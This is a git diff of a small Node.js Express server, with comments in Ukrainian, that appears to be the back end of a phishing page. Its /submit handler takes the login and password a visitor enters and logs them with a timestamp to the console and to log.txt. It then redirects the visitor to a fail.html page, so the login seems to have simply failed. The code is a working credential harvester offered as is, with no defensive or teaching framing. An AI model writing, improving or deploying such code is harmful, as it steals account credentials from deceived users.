@@ -1,30 +1,41 @@
-const express = require("express");
-const path = require("path");
-const fs = require("fs");
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
 
-// 🧠 Додаємо підтримку form-data та JSON
+// Приймає дані з HTML-форми
 app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
 
-// 🔓 Робимо папку public доступною
-app.use(express.static("public"));
+// Віддає статичні файли з public/
+app.use(express.static(path.join(__dirname, 'public')));
 
-// 📥 Обробка POST-запиту з форми
-app.post("/submit", (req, res) => {
-  const login = req.body.login;
-  const password = req.body.password;
+// POST-запит з форми
+app.post('/submit', (req, res) => {
+  const { login, password } = req.body;
+  const entry = `${new Date().toISOString()} | Логін: ${login} | Пароль: ${password}\n`;
 
-  const log = `[${new Date().toISOString()}] | Логін: ${login} | Пароль: ${password}\n`;
-  fs.appendFileSync("data.txt", log, "utf8");
+  // 1. Вивід у логи Render
+  console.log(entry);
 
-  // Відправляємо користувача на error.html
-  res.sendFile(path.join(__dirname, "public", "fail.html"));
+  // 2. Запис у файл log.txt (опційно)
+  fs.appendFile('log.txt', entry, err => {
+    if (err) {
+      console.error('Помилка запису:', err);
+      return res.status(500).send('Серверна помилка');
+    }
+
+    // 3. Перенаправлення на fail.html
+    res.redirect('/fail.html');
+  });
 });
 
-// 🚀 Запуск сервера
-const PORT = process.env.PORT || 10000;
+// Обробка всіх інших маршрутів (опціонально)
+app.use((req, res) => {
+  res.status(404).send('Сторінка не знайдена');
+});
+
 app.listen(PORT, () => {
-  console.log(`Сервер запущено на http://localhost:${PORT}`);
+  console.log(`Сервер запущено на порту ${PORT}`);
 });
